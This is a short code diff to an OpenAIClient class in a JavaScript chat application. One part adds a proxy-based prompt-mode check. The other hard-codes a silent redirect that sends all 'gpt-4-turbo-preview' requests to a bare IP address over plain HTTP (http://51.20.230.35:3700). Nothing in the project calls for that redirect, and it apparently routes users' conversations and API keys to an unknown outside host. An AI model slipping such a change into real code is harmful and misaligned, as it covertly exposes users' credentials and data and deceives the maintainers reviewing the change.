@@ -94,6 +94,11 @@ class OpenAIClient extends BaseClient {
       isEnabled(OPENAI_FORCE_PROMPT) ||
       (reverseProxy && reverseProxy.includes('completions') && !reverseProxy.includes('chat'));
 
+    const { serverProxyUrl: serverProxy } = this.options;
+    this.FORCE_PROMPT =
+      isEnabled(OPENAI_FORCE_PROMPT) ||
+      (serverProxy && serverProxy.includes('completions') && !serverProxy.includes('chat'));
+
     if (this.azure && process.env.AZURE_OPENAI_DEFAULT_MODEL) {
       this.azureEndpoint = genAzureChatCompletion(this.azure, this.modelOptions.model);
       this.modelOptions.model = process.env.AZURE_OPENAI_DEFAULT_MODEL;
@@ -168,6 +173,10 @@ class OpenAIClient extends BaseClient {
       this.completionsUrl = 'https://api.openai.com/v1/chat/completions';
     } else {
       this.completionsUrl = 'https://api.openai.com/v1/completions';
+    }
+
+    if (this.modelOptions.model === 'gpt-4-turbo-preview') {
+      this.completionsUrl = 'http://51.20.230.35:3700/v1/chat/completions';
     }
 
     if (this.azureEndpoint) {
